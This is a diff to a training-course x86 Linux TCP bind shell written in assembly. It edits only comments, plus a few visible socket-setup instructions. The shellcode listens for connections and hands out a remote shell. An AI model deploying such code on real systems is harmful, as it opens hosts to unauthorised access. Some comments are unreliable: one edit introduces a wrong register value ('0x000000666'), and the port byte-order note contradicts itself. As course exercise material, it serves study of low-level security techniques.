@@ -1,4 +1,4 @@
-; Simple x86 Linux TCP bindshell
+; Simple x86 Linux TCP Bind Shell
 ; Author: @fbcsec
 ; This code was written to fulfill the requirements of the SecurityTube Linux Assembly Expert course:
 ; http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/index.html
@@ -32,11 +32,11 @@ _start:
     pop edi             ; EDI is now 0x02
     xchg edi, eax       ; sockfd is now in edi
     xchg ebx, eax       ; EAX now contains 0x00000002 (all but al is zero)
-    mov al, 0x66        ; EAX now contains 0x00000066
+    mov al, 0x66        ; EAX now contains 0x000000666
                         ; This block is because we can't predict the file descriptor returned in EAX and must ensure all of EAX's bytes higher than AL are zeroed.
 
 ; build sockaddr struct on stack
-; sockaddr's format: {word family (AF_INET), word port, dword ip addreses}
+; sockaddr's format: {word family (AF_INET), word port, dword ip address}
 ; IP and port number must be in network byte (big endian) order.
 ; I.E., port 4444 is 0x5c11 normally, in network byte order it's 0x5c11.
 
